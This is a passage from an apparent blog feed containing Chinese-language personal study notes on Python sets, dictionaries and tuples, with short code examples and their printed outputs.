    <content type="html"><![CDATA[<h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h1><p>python内置数据结构，可变序列，无value的字典。</p><h2 id="创建："><a href="#创建：" class="headerlink" title="创建： {}"></a>创建： {}</h2><ul><li><code>s={'Python','world',90}</code></li><li>set() : <code>s=set(range(6))</code></li></ul><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">s</span>={<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">7</span>}<br><span class="hljs-attribute">print</span>(s) #{<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>}<br></code></pre></td></tr></tbody></table></figure><p>eg: </p><figure class="highlight angelscript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">s1=<span class="hljs-keyword">set</span>(range(<span class="hljs-number">6</span>))<br>print(s,type(s)) #{<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>} &lt;<span class="hljs-keyword">class</span> '<span class="hljs-symbol">set</span>'&gt;<br><span class="hljs-symbol">s3</span>=<span class="hljs-symbol">set</span>((<span class="hljs-symbol">1,<span class="hljs-symbol">2</span>,<span class="hljs-symbol">4</span>,<span class="hljs-symbol">4</span>,<span class="hljs-symbol">5</span>,<span class="hljs-symbol">65</span></span>))<br><span class="hljs-symbol">print</span>(<span class="hljs-symbol">s3,<span class="hljs-symbol">type</span></span>(<span class="hljs-symbol">s3</span>)) #{<span class="hljs-number">65</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>} &lt;<span class="hljs-keyword">class</span> '<span class="hljs-symbol">set</span>'&gt;<br> #集合中元素无序<br><span class="hljs-symbol">s4</span>=<span class="hljs-symbol">set</span>('<span class="hljs-symbol">python</span>')<br><span class="hljs-symbol">print</span>(<span class="hljs-symbol">s4,<span class="hljs-symbol">type</span></span>(<span class="hljs-symbol">s4</span>)) #{<span class="hljs-string">'o'</span>, <span class="hljs-string">'n'</span>, <span class="hljs-string">'y'</span>, <span class="hljs-string">'t'</span>, <span class="hljs-string">'h'</span>, <span class="hljs-string">'p'</span>} &lt;<span class="hljs-keyword">class</span> '<span class="hljs-symbol">set</span>'&gt;<br><span class="hljs-symbol">s5</span>=<span class="hljs-symbol">set</span>({<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,<span class="hljs-number">33</span>,<span class="hljs-number">25</span>,<span class="hljs-number">24</span>,<span class="hljs-number">23</span>})<br>print(s5,type(s5)) #{<span class="hljs-number">33</span>, <span class="hljs-number">4</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">12</span>} &lt;<span class="hljs-keyword">class</span> '<span class="hljs-symbol">set</span>'&gt;<br> #空集合<br><span class="hljs-symbol">s6</span>={} #字典类型<br>print(type(s6)) #&lt;<span class="hljs-keyword">class</span> '<span class="hljs-symbol">dict</span>'&gt;<br><span class="hljs-symbol">s7</span>=<span class="hljs-symbol">set</span>()<br><span class="hljs-symbol">print</span>(<span class="hljs-symbol">s7,<span class="hljs-symbol">type</span></span>(<span class="hljs-symbol">s7</span>)) #<span class="hljs-symbol">set</span>() &lt;<span class="hljs-symbol">class</span> '<span class="hljs-symbol">set</span>'&gt;<br></code></pre></td></tr></tbody></table></figure><h2 id="相关操作"><a href="#相关操作" class="headerlink" title="相关操作"></a>相关操作</h2><p>（1）判断： in 或 not in</p><p>（2）新增：</p><ul><li>add() : 一次添加一个元素</li><li>update() : 至少添加一个元素</li></ul><p>（3）删除：</p><ul><li>remove() : 一次删除一个指定元素，指定元素不存在抛出keyerror</li><li>discard(): 一次删除一个注定元素，指定元素不存在不抛出异常</li><li>pop(): 一次随机删除一个任意元素</li><li>clear(): 清空</li></ul><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">s</span>={<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>} <br><span class="hljs-attribute">print</span>(<span class="hljs-number">1</span> in s) #True<br><span class="hljs-attribute">print</span>(<span class="hljs-number">1</span> not in s) #False<br><span class="hljs-attribute">s</span>.add(<span class="hljs-number">80</span>)<br><span class="hljs-attribute">print</span>(s) #{<span class="hljs-number">80</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>}<br><span class="hljs-attribute">s</span>.update({<span class="hljs-number">100</span>,<span class="hljs-number">200</span>,<span class="hljs-number">300</span>})<br><span class="hljs-attribute">print</span>(s) #{<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">100</span>, <span class="hljs-number">200</span>, <span class="hljs-number">300</span>, <span class="hljs-number">80</span>}<br><span class="hljs-attribute">s</span>.update([<span class="hljs-number">100</span>,<span class="hljs-number">98</span>,<span class="hljs-number">89</span>])<br><span class="hljs-attribute">print</span>(s) #{<span class="hljs-number">1</span>, <span class="hljs-number">98</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">100</span>, <span class="hljs-number">200</span>, <span class="hljs-number">300</span>, <span class="hljs-number">80</span>, <span class="hljs-number">89</span>}<br><span class="hljs-attribute">s</span>.update([<span class="hljs-number">78</span>,<span class="hljs-number">64</span>,<span class="hljs-number">56</span>])<br><span class="hljs-attribute">print</span>(s)  #{<span class="hljs-number">64</span>, <span class="hljs-number">1</span>, <span class="hljs-number">98</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">100</span>, <span class="hljs-number">200</span>, <span class="hljs-number">300</span>, <span class="hljs-number">78</span>, <span class="hljs-number">80</span>, <span class="hljs-number">56</span>, <span class="hljs-number">89</span>} <br><span class="hljs-attribute">s</span>.remove(<span class="hljs-number">100</span>)<br><span class="hljs-attribute">print</span>(s) #{<span class="hljs-number">64</span>, <span class="hljs-number">1</span>, <span class="hljs-number">98</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">200</span>, <span class="hljs-number">300</span>, <span class="hljs-number">78</span>, <span class="hljs-number">80</span>, <span class="hljs-number">56</span>, <span class="hljs-number">89</span>}<br><span class="hljs-attribute">s</span>.discard(<span class="hljs-number">500</span>)<br><span class="hljs-attribute">print</span>(s) #{<span class="hljs-number">64</span>, <span class="hljs-number">1</span>, <span class="hljs-number">98</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">200</span>, <span class="hljs-number">300</span>, <span class="hljs-number">78</span>, <span class="hljs-number">80</span>, <span class="hljs-number">56</span>, <span class="hljs-number">89</span>}<br><span class="hljs-attribute">s</span>.discard(<span class="hljs-number">300</span>)<br><span class="hljs-attribute">print</span>(s) #{<span class="hljs-number">64</span>, <span class="hljs-number">1</span>, <span class="hljs-number">98</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">200</span>, <span class="hljs-number">78</span>, <span class="hljs-number">80</span>, <span class="hljs-number">56</span>, <span class="hljs-number">89</span>}<br><span class="hljs-attribute">s</span>.pop()<br><span class="hljs-attribute">print</span>(s) #{<span class="hljs-number">1</span>, <span class="hljs-number">98</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">200</span>, <span class="hljs-number">78</span>, <span class="hljs-number">80</span>, <span class="hljs-number">56</span>, <span class="hljs-number">89</span>}<br><span class="hljs-attribute">s</span>.clear()<br><span class="hljs-attribute">print</span>(s) #set()<br></code></pre></td></tr></tbody></table></figure><h2 id="集合间的关系"><a href="#集合间的关系" class="headerlink" title="集合间的关系"></a>集合间的关系</h2><ul><li>是否相等： == 或 !=</li><li>一个集合是否为另一集合的子集： issubset<ul><li>b是a的子集</li></ul></li><li>一个集合是否为另一集合的超集： issuperset<ul><li>a是b的超集</li></ul></li><li>两集合是否无交集： isdisjoint</li></ul><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">s</span>={<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>}<br><span class="hljs-attribute">s2</span>={<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">20</span>,<span class="hljs-number">10</span>}<br><span class="hljs-attribute">print</span>(s==s2) #True<br><span class="hljs-attribute">print</span>(s!=s2) #False<br></code></pre></td></tr></tbody></table></figure><p>eg:</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">s1={<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>,<span class="hljs-number">60</span>}<br>s2={<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>}<br>s3={<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">90</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s2.issubset(s1)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s3.issubset(s2)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1.issuperset(s2)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1.issuperset(s3)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s2.isdisjoint(s3)</span></span>)<br>s4={<span class="hljs-number">100</span>,<span class="hljs-number">200</span>,<span class="hljs-number">300</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s2.isdisjoint(s4)</span></span>)<br> <span class="hljs-selector-id">#True</span><br> <span class="hljs-selector-id">#False</span><br> <span class="hljs-selector-id">#True</span><br> <span class="hljs-selector-id">#False</span><br> <span class="hljs-selector-id">#False</span><br> #True<br></code></pre></td></tr></tbody></table></figure><h2 id="集合的数学操作"><a href="#集合的数学操作" class="headerlink" title="集合的数学操作"></a>集合的数学操作</h2><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">s1={<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>}<br>s2={<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>,<span class="hljs-number">60</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1.intersection(s2)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1 &amp; s2)</span></span> #{<span class="hljs-number">40</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1.union(s2)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1 | s2)</span></span> #{<span class="hljs-number">40</span>, <span class="hljs-number">10</span>, <span class="hljs-number">50</span>, <span class="hljs-number">20</span>, <span class="hljs-number">60</span>, <span class="hljs-number">30</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1.difference(s2)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1-s2)</span></span> #{<span class="hljs-number">10</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1.symmetric_difference(s2)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1^s2)</span></span> #{<span class="hljs-number">50</span>, <span class="hljs-number">10</span>, <span class="hljs-number">60</span>}<br></code></pre></td></tr></tbody></table></figure><h2 id="集合生成式"><a href="#集合生成式" class="headerlink" title="集合生成式"></a>集合生成式</h2><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">lst</span>=[i*i for i in range(<span class="hljs-number">6</span>)]<br><span class="hljs-attribute">print</span>(lst) #[<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">16</span>, <span class="hljs-number">25</span>]<br><span class="hljs-attribute">s</span>={i*i for i in range(<span class="hljs-number">6</span>)}<br><span class="hljs-attribute">print</span>(s) #{<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">16</span>, <span class="hljs-number">25</span>}<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python学习4</title>
    <link href="/2022/09/05/python%E5%AD%A6%E4%B9%A04/"/>
    <url>/2022/09/05/python%E5%AD%A6%E4%B9%A04/</url>
    
    <content type="html"><![CDATA[<p>(啊，最近找工作找的心烦意乱，心浮气躁，都没办法静下心学习了，摆烂了好几天之后深觉不应该如此，无论找工作怎么样子，每天的学习也不应该中断)</p><h1 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h1><p>列表： []</p><p>字典： {} 可变序列，以键值对方式存储数据</p><p>根据key查找value所在位置。</p><h2 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h2><pre><code class="hljs">score={'张三':100,'李四':98,'王五':45}内置函数dict(name='jack',age=20)</code></pre><p>eg:</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">score={<span class="hljs-string">'张三'</span>:<span class="hljs-number">100</span>,<span class="hljs-string">'李四'</span>:<span class="hljs-number">98</span>,<span class="hljs-string">'王五'</span>:<span class="hljs-number">45</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(score)</span></span> #{<span class="hljs-string">'张三'</span>: <span class="hljs-number">100</span>, <span class="hljs-string">'李四'</span>: <span class="hljs-number">98</span>, <span class="hljs-string">'王五'</span>: <span class="hljs-number">45</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(type(score)</span></span>) #&lt;class <span class="hljs-string">'dict'</span>&gt;<br>s=<span class="hljs-built_in">dict</span>(name=<span class="hljs-string">'jack'</span>,age=<span class="hljs-number">20</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s)</span></span> #{<span class="hljs-string">'name'</span>: <span class="hljs-string">'jack'</span>, <span class="hljs-string">'age'</span>: <span class="hljs-number">20</span>}<br>d={}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(d)</span></span> #{}<br></code></pre></td></tr></tbody></table></figure><h2 id="元素获取"><a href="#元素获取" class="headerlink" title="元素获取"></a>元素获取</h2><ul><li>[]: score[‘张三’] <ul><li>若字典中不存在指定key,则抛出keyerror</li></ul></li><li>get(): score.get(‘张三’)<ul><li>若不存在key，则返回None</li></ul></li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">score={<span class="hljs-string">'张三'</span>:<span class="hljs-number">100</span>,<span class="hljs-string">'李四'</span>:<span class="hljs-number">98</span>,<span class="hljs-string">'王五'</span>:<span class="hljs-number">45</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(score[<span class="hljs-string">'张三'</span>])</span></span> <span class="hljs-number">#100</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(score.get(<span class="hljs-string">'张三'</span>)</span></span>) <span class="hljs-number">#100</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(score.get(<span class="hljs-string">'陈六'</span>)</span></span>) <span class="hljs-selector-id">#None</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(score.get(<span class="hljs-string">'嘛七'</span>,<span class="hljs-number">99</span>)</span></span>) #<span class="hljs-number">99</span> #<span class="hljs-number">99</span>是嘛七所对value不存在时提供的默认值<br></code></pre></td></tr></tbody></table></figure><h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><h3 id="key的判断"><a href="#key的判断" class="headerlink" title="key的判断"></a>key的判断</h3><ul><li>in : key在字典中返回True</li><li>not in : key不在字典中返回True</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">score={<span class="hljs-string">'张三'</span>:<span class="hljs-number">100</span>,<span class="hljs-string">'李四'</span>:<span class="hljs-number">98</span>,<span class="hljs-string">'王五'</span>:<span class="hljs-number">45</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'张三'</span> in score)</span></span> <span class="hljs-selector-id">#True</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'张三'</span> not in score)</span></span> #False<br></code></pre></td></tr></tbody></table></figure><h3 id="元素删除"><a href="#元素删除" class="headerlink" title="元素删除"></a>元素删除</h3><pre><code class="hljs">del score['张三']print(score) #{'李四': 98, '王五': 45}score.clear() #清空字典print(score) #{}</code></pre><h3 id="元素新增"><a href="#元素新增" class="headerlink" title="元素新增"></a>元素新增</h3><pre><code class="hljs">score['陈六']=98print(score) #{'李四': 98, '王五': 45, '陈六': 98}</code></pre><h3 id="元素修改"><a href="#元素修改" class="headerlink" title="元素修改"></a>元素修改</h3><pre><code class="hljs">score['陈六']=1001print(score) #{'李四': 98, '王五': 45, '陈六': 1001}</code></pre><h3 id="获取字典视图的三个方法"><a href="#获取字典视图的三个方法" class="headerlink" title="获取字典视图的三个方法"></a>获取字典视图的三个方法</h3><ul><li>keys() 获取字典中所有key</li><li>value() 获取字典中所有value</li><li>items() 获取字典中所有key,value对</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">score={<span class="hljs-string">'张三'</span>:<span class="hljs-number">100</span>,<span class="hljs-string">'李四'</span>:<span class="hljs-number">98</span>,<span class="hljs-string">'王五'</span>:<span class="hljs-number">45</span>}<br> #获取所有key<br>keys=score<span class="hljs-selector-class">.keys</span>()<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(keys)</span></span> <span class="hljs-selector-id">#dict_keys</span>(<span class="hljs-selector-attr">[<span class="hljs-string">'张三'</span>, <span class="hljs-string">'李四'</span>, <span class="hljs-string">'王五'</span>]</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list(keys)</span></span>) #<span class="hljs-selector-attr">[<span class="hljs-string">'张三'</span>, <span class="hljs-string">'李四'</span>, <span class="hljs-string">'王五'</span>]</span> 将所有key组成的视图转成列表<br> #获取所有value<br>values=score<span class="hljs-selector-class">.values</span>()<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(values)</span></span> <span class="hljs-selector-id">#dict_values</span>(<span class="hljs-selector-attr">[100, 98, 45]</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list(values)</span></span>) #<span class="hljs-selector-attr">[100, 98, 45]</span><br> #获取所有键值对<br>items=score<span class="hljs-selector-class">.items</span>()<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(items)</span></span> <span class="hljs-selector-id">#dict_items</span>(<span class="hljs-selector-attr">[(<span class="hljs-string">'张三'</span>, 100), (<span class="hljs-string">'李四'</span>, 98), (<span class="hljs-string">'王五'</span>, 45)]</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list(items)</span></span>) #<span class="hljs-selector-attr">[(<span class="hljs-string">'张三'</span>, 100), (<span class="hljs-string">'李四'</span>, 98), (<span class="hljs-string">'王五'</span>, 45)]</span><br></code></pre></td></tr></tbody></table></figure><h3 id="元素遍历"><a href="#元素遍历" class="headerlink" title="元素遍历"></a>元素遍历</h3><figure class="highlight applescript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs applescript">score={'张三':<span class="hljs-number">100</span>,'李四':<span class="hljs-number">98</span>,'王五':<span class="hljs-number">45</span>}<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">item</span> <span class="hljs-keyword">in</span> score:<br>    print(<span class="hljs-built_in">item</span>)<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">item</span> <span class="hljs-keyword">in</span> score:<br>    print(<span class="hljs-built_in">item</span>,score[<span class="hljs-built_in">item</span>],score.<span class="hljs-keyword">get</span>(<span class="hljs-built_in">item</span>))<br> <span class="hljs-comment">#张三 100 100</span><br> <span class="hljs-comment">#李四 98 98</span><br> <span class="hljs-comment">#王五 45 45</span><br></code></pre></td></tr></tbody></table></figure><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li>所有元素都是key-value键值对，key不可重复，value可重复</li><li>无序</li><li>key不可变</li><li>字典可动态伸缩</li><li>字典较大浪费内存，是一种使用空间换时间的数据结构</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">d={<span class="hljs-string">'name'</span>:<span class="hljs-string">'张三'</span>,<span class="hljs-string">'name'</span>:<span class="hljs-string">'李四'</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(d)</span></span> #{<span class="hljs-string">'name'</span>: <span class="hljs-string">'李四'</span>}<br>d={<span class="hljs-string">'name'</span>:<span class="hljs-string">'张三'</span>,<span class="hljs-string">'nikename'</span>:<span class="hljs-string">'李四'</span>}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(d)</span></span> #{<span class="hljs-string">'name'</span>: <span class="hljs-string">'张三'</span>, <span class="hljs-string">'nikename'</span>: <span class="hljs-string">'李四'</span>}<br>lst=<span class="hljs-selector-attr">[10,20,30]</span><br>lst<span class="hljs-selector-class">.insert</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(lst)</span></span> #<span class="hljs-selector-attr">[10,100,20,30]</span><br></code></pre></td></tr></tbody></table></figure><h3 id="字典生成式"><a href="#字典生成式" class="headerlink" title="字典生成式"></a>字典生成式</h3><p>内置函数zip()</p><p>用于将可迭代对象作为参数，将对象中对应的元素打包成一个元组，然后返回由这些元组组成的列表。</p><pre><code class="hljs">{item.upper() （#这是key）:price(#这是value) for item,price(#自定义变量key,value) in zip(items,prices(#可迭代对象))}</code></pre><p>eg:</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">items=<span class="hljs-selector-attr">[<span class="hljs-string">'Fruits'</span>,<span class="hljs-string">'Books'</span>,<span class="hljs-string">'Others'</span>]</span><br>prices=<span class="hljs-selector-attr">[96,78,85]</span><br>{ item<span class="hljs-selector-class">.upper</span>():price  <span class="hljs-keyword">for</span> item,price <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(items,prices)}<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(d)</span></span> #{<span class="hljs-string">'name'</span>: <span class="hljs-string">'张三'</span>, <span class="hljs-string">'nikename'</span>: <span class="hljs-string">'李四'</span>}<br></code></pre></td></tr></tbody></table></figure><h1 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h1><p>python内置数据结构之以，不可变序列</p><h2 id="创建-1"><a href="#创建-1" class="headerlink" title="创建"></a>创建</h2><ul><li><code>t=('Python','hello',90)</code></li><li>内置函数tuple() <code>t=tuple(('Python','hello',90))</code></li><li>t=(10,) 单元素要加逗号用以区分</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">t=<span class="hljs-built_in">tuple</span>((<span class="hljs-string">'Python'</span>,<span class="hljs-string">'world'</span>,<span class="hljs-number">90</span>))<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(t)</span></span> #(<span class="hljs-string">'Python'</span>, <span class="hljs-string">'world'</span>, <span class="hljs-number">90</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(type(t)</span></span>) #&lt;class <span class="hljs-string">'tuple'</span>&gt;<br>t2=<span class="hljs-string">'Python'</span>,<span class="hljs-string">'world'</span>,<span class="hljs-number">90</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(type(t2)</span></span>) #&lt;class <span class="hljs-string">'tuple'</span>&gt;<br>t3=(<span class="hljs-string">'Python'</span>,)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(type(t3)</span></span>) #&lt;class <span class="hljs-string">'tuple'</span>&gt;<br>t1=<span class="hljs-built_in">tuple</span>((<span class="hljs-string">'Python'</span>,<span class="hljs-string">'world'</span>,<span class="hljs-number">90</span>))<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(t1)</span></span> #(<span class="hljs-string">'Python'</span>, <span class="hljs-string">'world'</span>, <span class="hljs-number">90</span>)<br></code></pre></td></tr></tbody></table></figure><p>空列表、字典、元组</p><figure class="highlight abnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">lst</span><span class="hljs-operator">=</span>[]<br><span class="hljs-attribute">list1</span><span class="hljs-operator">=</span>list()<br><span class="hljs-attribute">d</span><span class="hljs-operator">=</span>{}<br><span class="hljs-attribute">d1</span><span class="hljs-operator">=</span>dict()<br><span class="hljs-attribute">t</span><span class="hljs-operator">=</span>()<br><span class="hljs-attribute">t1</span><span class="hljs-operator">=</span>tuple()<br></code></pre></td></tr></tbody></table></figure><h2 id="为何元组不可变"><a href="#为何元组不可变" class="headerlink" 